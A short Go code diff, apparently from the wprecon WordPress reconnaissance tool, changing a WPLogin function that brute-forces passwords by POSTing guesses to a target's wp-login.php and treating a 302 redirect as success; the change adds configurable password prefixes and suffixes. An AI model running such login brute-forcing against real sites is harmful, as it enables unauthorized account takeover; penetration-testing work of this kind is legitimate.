@@ -5,7 +5,7 @@ import (
 	httplib "net/http"
 	"net/url"
 
-	. "github.com/blackbinn/wprecon/cli/config"
+	"github.com/blackbinn/wprecon/internal/database"
 	"github.com/blackbinn/wprecon/pkg/gohttp"
 	"github.com/blackbinn/wprecon/pkg/printer"
 )
@@ -13,14 +13,17 @@ import (
 func WPLogin(channel chan [2]int, username string, passwords []string) {
 	http := gohttp.NewHTTPClient()
 	http.SetMethod("POST")
-	http.SetURL(Database.Target).SetURLDirectory("wp-login.php")
+	http.SetURL(database.Memory.GetString("Target")).SetURLDirectory("wp-login.php")
 	http.SetContentType("application/x-www-form-urlencoded")
 	http.FirewallDetection(true)
+
+	var pprefix = database.Memory.GetString("Passwords Prefix")
+	var psuffix = database.Memory.GetString("Passwords Suffix")
 
 	var done bool
 
 	req := func(password string) bool {
-		http.SetForm(&url.Values{"log": {username}, "pwd": {password}})
+		http.SetForm(&url.Values{"log": {username}, "pwd": {pprefix + password + psuffix}})
 		http.SetRedirectFunc(func(req *httplib.Request, via []*httplib.Request) error {
 			if req.Response.StatusCode == 302 {
 				done = true
